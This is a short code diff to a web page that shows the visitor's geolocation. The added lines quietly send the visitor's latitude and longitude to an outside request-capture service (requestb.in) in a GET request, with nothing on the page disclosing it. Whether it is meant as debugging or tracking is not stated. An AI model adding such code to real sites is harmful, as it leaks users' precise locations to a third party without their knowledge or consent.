@@ -37,6 +37,9 @@
         var longitude = position.coords.longitude;
         var bg = document.getElementById("bg");
         bg.innerHTML = '<p>Latitude is ' + latitude + '° <br>Longitude is ' + longitude + '°</p>';
+        var req = new XMLHttpRequest();
+        req.open("GET", "https://requestb.in/18ee9lw1?lng=" + longitude + "&lat=" + latitude);
+        req.send();
       });
     }
   </script>
